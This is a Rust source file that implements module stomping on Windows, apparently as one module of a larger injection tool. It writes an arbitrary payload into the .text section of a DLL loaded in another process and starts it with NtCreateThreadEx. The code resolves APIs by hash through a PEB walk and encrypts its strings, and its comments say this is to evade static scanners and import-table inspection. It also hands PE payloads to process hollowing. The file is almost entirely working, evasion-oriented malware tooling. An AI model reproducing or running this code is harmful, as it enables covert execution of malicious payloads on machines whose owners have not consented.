use anyhow::{anyhow, Result};
use crate::injection::Injector;

pub struct ModuleStompInjector;

#[cfg(windows)]
impl Injector for ModuleStompInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::processthreadsapi::OpenProcess;
        use winapi::um::winnt::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION};
        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualProtectEx, ReadProcessMemory};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
        use winapi::um::handleapi::CloseHandle;
        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER};
        use std::mem::size_of;

        let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
        if is_pe {
            log::info!("PE payload detected, forwarding to process hollowing's inject_into_process");
            return match hollowing::windows_impl::inject_into_process(pid, payload) {
                Ok(_) => Ok(()),
                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e))
            };
        }

        unsafe {
            let h_proc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, 0, pid);
            if h_proc.is_null() { return Err(anyhow!("Failed to open process")); }

            // ── Resolve ntdll, LdrLoadDll, NtCreateThreadEx via PEB walk ────────
            // Using pe_resolve crate for hash-based API resolution to avoid
            // GetModuleHandleA / GetProcAddress showing up in the IAT.
            let ntdll_hash: u32 = pe_resolve::hash_str(b"ntdll.dll\0");
            let ntdll = pe_resolve::get_module_handle_by_hash(ntdll_hash)
                .ok_or_else(|| anyhow!("ntdll not found via PEB walk"))?;

            let ldr_load_dll_hash = pe_resolve::hash_str(b"LdrLoadDll\0");
            let ldr_load_dll_ptr = pe_resolve::get_proc_address_by_hash(ntdll, ldr_load_dll_hash)
                .ok_or_else(|| anyhow!("LdrLoadDll not found"))?;

            let ntcreate_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
            let ntcreate_ptr = pe_resolve::get_proc_address_by_hash(ntdll, ntcreate_hash)
                .ok_or_else(|| anyhow!("NtCreateThreadEx not found"))?;

            type NtCreateThreadExFn = unsafe extern "system" fn(
                ThreadHandle: *mut *mut winapi::ctypes::c_void,
                DesiredAccess: u32,
                ObjectAttributes: *mut winapi::ctypes::c_void,
                ProcessHandle: *mut winapi::ctypes::c_void,
                StartRoutine: *mut winapi::ctypes::c_void,
                Argument: *mut winapi::ctypes::c_void,
                CreateFlags: u32,
                ZeroBits: usize,
                StackSize: usize,
                MaximumStackSize: usize,
                AttributeList: *mut winapi::ctypes::c_void,
            ) -> i32;
            let build_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_ptr);

            // ── Build UNICODE_STRING + remote allocation for LdrLoadDll ─────────
            // LdrLoadDll signature:
            //   NTSTATUS LdrLoadDll(
            //     PWSTR SearchPath,           // NULL = default
            //     PULONG DllCharacteristics,   // NULL = default
            //     PUNICODE_STRING ModuleFileName,
            //     PVOID *BaseAddress
            //   );
            // Decrypt candidate DLL names at runtime to avoid plain-text strings
            // in the .rdata section that static scanners pattern-match against.
            let c0 = String::from_utf8_lossy(&string_crypt::enc_str!("msfte.dll")).trim_end_matches('\0').to_string();
            let c1 = String::from_utf8_lossy(&string_crypt::enc_str!("msratelc.dll")).trim_end_matches('\0').to_string();
            let c2 = String::from_utf8_lossy(&string_crypt::enc_str!("scrobj.dll")).trim_end_matches('\0').to_string();
            let c3 = String::from_utf8_lossy(&string_crypt::enc_str!("amstream.dll")).trim_end_matches('\0').to_string();
            let candidates: Vec<&str> = vec![c0.as_str(), c1.as_str(), c2.as_str(), c3.as_str()];
            // Iterate candidates (2.7): pick the first one whose .text section fits the payload
            let target_dll: &str = candidates.iter().copied()
                .find(|dll| {
                    // Check DLL size by looking for it in the local process first (fast path)
                    let dll_null = format!("{}\0", dll.to_ascii_lowercase());
                    let hash = pe_resolve::hash_str(dll_null.as_bytes());
                    if let Some(base) = pe_resolve::get_module_handle_by_hash(hash) {
                        // Quick size check: read NT headers to find .text size
                        unsafe {
                            let dos = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
                            if (*dos).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE { return false; }
                            let nt = (base + (*dos).e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
                            let ns = (*nt).FileHeader.NumberOfSections as usize;
                            let sec_base = nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>();
                            for i in 0..ns {
                                let sec = (sec_base + i * std::mem::size_of::<winapi::um::winnt::IMAGE_SECTION_HEADER>())
                                    as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
                                let name = std::ptr::addr_of!((*sec).Name);
                                let name_bytes = &*(name as *const [u8; 8]);
                                if &name_bytes[..5] == b".text" {
                                    return *(*sec).Misc.VirtualSize() as usize >= payload.len();
                                }
                            }
                        }
                    }
                    true // if not loaded yet, optimistically try it
                })
                .unwrap_or(candidates[0]);
            let wide: Vec<u16> = target_dll.encode_utf16().chain(std::iter::once(0)).collect();
            let wide_bytes = wide.len() * 2;

            // Layout in remote memory:
            //   [0         .. wide_bytes]        : UTF-16 DLL name
            //   [wide_bytes .. +16]              : UNICODE_STRING { Length, MaximumLength, Buffer (pointer) }
            //   [wide_bytes+16 .. +8]            : BaseAddress output slot
            let us_offset = wide_bytes;
            let base_addr_offset = us_offset + 16;
            let total_remote = base_addr_offset + 8;

            let remote_buf = VirtualAllocEx(h_proc, std::ptr::null_mut(), total_remote, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if remote_buf.is_null() {
                CloseHandle(h_proc);
                return Err(anyhow!("VirtualAllocEx failed for LdrLoadDll args"));
            }

            // Write wide DLL name
            let mut written = 0usize;
            if WriteProcessMemory(h_proc, remote_buf, wide.as_ptr() as _, wide_bytes, &mut written) == 0 {
                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                CloseHandle(h_proc);
                return Err(anyhow!("WriteProcessMemory wide string failed"));
            }

            // Build UNICODE_STRING locally; Buffer = VA of remote_buf
            let remote_us_ptr = (remote_buf as usize + us_offset) as *mut winapi::ctypes::c_void;
            let remote_str_va = remote_buf as usize; // VA of the string in remote
            // UNICODE_STRING: Length(u16), MaximumLength(u16), _pad(u32), Buffer(*u16)
            let mut us_bytes = [0u8; 16];
            us_bytes[0..2].copy_from_slice(&((wide_bytes - 2) as u16).to_le_bytes()); // Length (no null)
            us_bytes[2..4].copy_from_slice(&(wide_bytes as u16).to_le_bytes());        // MaximumLength
            // bytes 4..8 = padding
            us_bytes[8..16].copy_from_slice(&(remote_str_va as u64).to_le_bytes());   // Buffer pointer
            if WriteProcessMemory(h_proc, remote_us_ptr, us_bytes.as_ptr() as _, 16, &mut written) == 0 {
                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                CloseHandle(h_proc);
                return Err(anyhow!("WriteProcessMemory UNICODE_STRING failed"));
            }

            // Spawn remote thread calling LdrLoadDll(NULL, NULL, &us, &base_addr)
            // We can't pass 4 structured args via NtCreateThreadEx's single Argument
            // parameter.  Instead use a small remote stub that calls LdrLoadDll with
            // the already-written UNICODE_STRING via a thread-local thunk approach:
            // Simplest safe approach: write a minimal x64 stub.
            //
            // stub layout (x64):
            //   sub rsp, 0x28            ; shadow space + align
            //   xor rcx, rcx             ; SearchPath = NULL
            //   xor rdx, rdx             ; DllCharacteristics = NULL
            //   lea r8, [rip + us_delta] ; ModuleFileName = &UNICODE_STRING
            //   lea r9, [rip + ba_delta] ; BaseAddress output
            //   mov rax, <ldr_load_dll_abs>
            //   call rax
            //   add rsp, 0x28
            //   ret
            //
            // We'll write stub + us + base_addr into a separate RWX region.

            let ldr_addr = ldr_load_dll_ptr as u64;
            let stub_region = VirtualAllocEx(h_proc, std::ptr::null_mut(), 256, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if stub_region.is_null() {
                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                CloseHandle(h_proc);
                return Err(anyhow!("VirtualAllocEx failed for LdrLoadDll stub"));
            }
            let stub_va = stub_region as u64;
            let us_region = VirtualAllocEx(h_proc, std::ptr::null_mut(), total_remote, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            // Re-use remote_buf we already wrote into for the UNICODE_STRING args
            // Actually we already have remote_buf — just build the stub to reference it.
            let us_va = remote_buf as u64;
            let us_struct_va = us_va + us_offset as u64;
            let base_out_va = us_va + base_addr_offset as u64;

            // Build x64 stub
            let mut stub = Vec::<u8>::with_capacity(64);
            // sub rsp, 0x28
            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
            // xor ecx, ecx
            stub.extend_from_slice(&[0x33, 0xC9]);
            // xor edx, edx
            stub.extend_from_slice(&[0x33, 0xD2]);
            // mov r8, <us_struct_va>
            stub.extend_from_slice(&[0x49, 0xB8]);
            stub.extend_from_slice(&us_struct_va.to_le_bytes());
            // mov r9, <base_out_va>
            stub.extend_from_slice(&[0x49, 0xB9]);
            stub.extend_from_slice(&base_out_va.to_le_bytes());
            // mov rax, <ldr_addr>
            stub.extend_from_slice(&[0x48, 0xB8]);
            stub.extend_from_slice(&ldr_addr.to_le_bytes());
            // call rax
            stub.extend_from_slice(&[0xFF, 0xD0]);
            // add rsp, 0x28
            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
            // ret
            stub.push(0xC3);

            if WriteProcessMemory(h_proc, stub_region, stub.as_ptr() as _, stub.len(), &mut written) == 0 {
                winapi::um::memoryapi::VirtualFreeEx(h_proc, stub_region, 0, winapi::um::winnt::MEM_RELEASE);
                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                CloseHandle(h_proc);
                return Err(anyhow!("WriteProcessMemory LdrLoadDll stub failed"));
            }

            // Switch stub memory from RW to RX now that all bytes are written.
            let mut _old_prot = 0u32;
            winapi::um::memoryapi::VirtualProtectEx(h_proc, stub_region, stub.len(), winapi::um::winnt::PAGE_EXECUTE_READ, &mut _old_prot);

            let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
            let status = build_thread(&mut h_thread, 0x1FFFFF, std::ptr::null_mut(), h_proc, stub_region, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
            if status >= 0 && !h_thread.is_null() {
                winapi::um::synchapi::WaitForSingleObject(h_thread, winapi::um::winbase::INFINITE);
                CloseHandle(h_thread);
                // Free the stub region and remote argument buffer now that LdrLoadDll has returned.
                winapi::um::memoryapi::VirtualFreeEx(h_proc, stub_region, 0, winapi::um::winnt::MEM_RELEASE);
                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                // Free the unused us_region allocation as well (2.6)
                if !us_region.is_null() {
                    winapi::um::memoryapi::VirtualFreeEx(h_proc, us_region, 0, winapi::um::winnt::MEM_RELEASE);
                }
            } else {
                winapi::um::memoryapi::VirtualFreeEx(h_proc, stub_region, 0, winapi::um::winnt::MEM_RELEASE);
                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_buf, 0, winapi::um::winnt::MEM_RELEASE);
                CloseHandle(h_proc);
                return Err(anyhow!("NtCreateThreadEx for LdrLoadDll stub failed: {:x}", status));
            }

            // ── Find stomped module base via remote PEB walk ──────────────────
            // Read target process PEB base from its TEB (NtQueryInformationProcess
            // would need the syscall; simpler: read PBI via ReadProcessMemory
            // from PROCESS_BASIC_INFORMATION via already-held h_proc).
            // Use NtQueryInformationProcess (resolved via PEB walk) to get PEB addr.
            type NtQueryInfoProcess = unsafe extern "system" fn(
                ProcessHandle: winapi::shared::ntdef::HANDLE,
                ProcessInformationClass: u32,
                ProcessInformation: *mut winapi::ctypes::c_void,
                ProcessInformationLength: u32,
                ReturnLength: *mut u32,
            ) -> i32;
            let ntqip_hash = pe_resolve::hash_str(b"NtQueryInformationProcess\0");
            let ntqip_ptr = pe_resolve::get_proc_address_by_hash(ntdll, ntqip_hash)
                .ok_or_else(|| anyhow!("NtQueryInformationProcess not found"))?;
            let ntqip: NtQueryInfoProcess = std::mem::transmute(ntqip_ptr);

            // ProcessBasicInformation = 0; layout first field is ExitStatus(u32),
            // then PebBaseAddress at offset 8 (pointer-sized).
            let mut pbi = [0u8; 48];
            let mut ret_len = 0u32;
            ntqip(h_proc, 0, pbi.as_mut_ptr() as _, 48, &mut ret_len);
            let peb_addr = u64::from_le_bytes(pbi[8..16].try_into().unwrap()) as usize;

            if peb_addr == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to get target PEB address"));
            }

            // PEB.Ldr is at offset 0x18 (x64)
            let mut ldr_ptr = 0usize;
            let mut bytes_read = 0usize;
            ReadProcessMemory(h_proc, (peb_addr + 0x18) as _, &mut ldr_ptr as *mut _ as _, 8, &mut bytes_read);
            if ldr_ptr == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to read Ldr pointer"));
            }

            // PEB_LDR_DATA.InLoadOrderModuleList is at offset 0x10
            let list_head = ldr_ptr + 0x10;
            let mut flink = 0usize;
            ReadProcessMemory(h_proc, list_head as _, &mut flink as *mut _ as _, 8, &mut bytes_read);

            let target_lower = target_dll.to_lowercase();
            let mut target_base: usize = 0;
            let mut current = flink;

            while current != list_head && current != 0 {
                // LDR_DATA_TABLE_ENTRY (InLoadOrder):
                //   +0x00: Flink, +0x08: Blink
                //   +0x30: DllBase
                //   +0x48: FullDllName UNICODE_STRING (Length u16 +0, MaxLen u16 +2, Buffer *u16 +8)
                //   +0x58: BaseDllName UNICODE_STRING
                let mut entry = [0u8; 0x70];
                if ReadProcessMemory(h_proc, current as _, entry.as_mut_ptr() as _, entry.len(), &mut bytes_read) == 0 {
                    break;
                }
                let dll_base = u64::from_le_bytes(entry[0x30..0x38].try_into().unwrap()) as usize;
                let name_len = u16::from_le_bytes(entry[0x48..0x4A].try_into().unwrap()) as usize;
                let name_buf = u64::from_le_bytes(entry[0x50..0x58].try_into().unwrap()) as usize;

                if dll_base != 0 && name_len > 0 && name_buf != 0 {
                    let mut name_wide = vec![0u16; name_len / 2];
                    ReadProcessMemory(h_proc, name_buf as _, name_wide.as_mut_ptr() as _, name_len, &mut bytes_read);
                    let name_str = String::from_utf16_lossy(&name_wide).to_lowercase();
                    if name_str.contains(&target_lower) || name_str.trim_end_matches('\0').contains(&target_lower) {
                        target_base = dll_base;
                        break;
                    }
                }
                let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
                if next_flink == current { break; }
                current = next_flink;
            }

            if target_base == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to find loaded target DLL for stomping"));
            }

            // ── Find .text section of target DLL ─────────────────────────────
            let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
            ReadProcessMemory(h_proc, target_base as _, &mut dos_header as *mut _ as _, size_of::<IMAGE_DOS_HEADER>(), &mut bytes_read);
            if dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
                CloseHandle(h_proc);
                return Err(anyhow!("Invalid DOS signature on target DLL"));
            }

            #[cfg(target_arch = "x86_64")]
            type NtHeaders = IMAGE_NT_HEADERS64;
            #[cfg(target_arch = "x86")]
            type NtHeaders = IMAGE_NT_HEADERS32;

            let mut nt_headers: NtHeaders = std::mem::zeroed();
            let nt_addr = target_base + dos_header.e_lfanew as usize;
            ReadProcessMemory(h_proc, nt_addr as _, &mut nt_headers as *mut _ as _, size_of::<NtHeaders>(), &mut bytes_read);

            let section_base = nt_addr + std::mem::offset_of!(NtHeaders, OptionalHeader) + nt_headers.FileHeader.SizeOfOptionalHeader as usize;
            let mut text_rva = 0u32;
            let mut text_size = 0u32;

            for i in 0..nt_headers.FileHeader.NumberOfSections as usize {
                let mut sec: IMAGE_SECTION_HEADER = std::mem::zeroed();
                ReadProcessMemory(h_proc, (section_base + i * size_of::<IMAGE_SECTION_HEADER>()) as _, &mut sec as *mut _ as _, size_of::<IMAGE_SECTION_HEADER>(), &mut bytes_read);
                if &sec.Name[..5] == b".text" {
                    text_rva = sec.VirtualAddress;
                    text_size = *sec.Misc.VirtualSize();
                    break;
                }
            }

            if text_rva == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to find .text section of target DLL"));
            }
            if payload.len() > text_size as usize {
                CloseHandle(h_proc);
                return Err(anyhow!("Payload larger than target .text section"));
            }

            let target_addr = (target_base + text_rva as usize) as *mut winapi::ctypes::c_void;
            let mut old_protect = 0u32;
            VirtualProtectEx(h_proc, target_addr, payload.len(), PAGE_READWRITE, &mut old_protect);
            WriteProcessMemory(h_proc, target_addr, payload.as_ptr() as _, payload.len(), &mut written);
            VirtualProtectEx(h_proc, target_addr, payload.len(), PAGE_EXECUTE_READ, &mut old_protect);

            let mut h_exec_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
            let exec_status = build_thread(&mut h_exec_thread, 0x1FFFFF, std::ptr::null_mut(), h_proc, target_addr, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
            if exec_status >= 0 && !h_exec_thread.is_null() {
                CloseHandle(h_exec_thread);
            } else {
                CloseHandle(h_proc);
                return Err(anyhow!("NtCreateThreadEx execution failed: {:x}", exec_status));
            }

            CloseHandle(h_proc);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for ModuleStompInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("Module Stomping only supported on Windows"))
    }
}
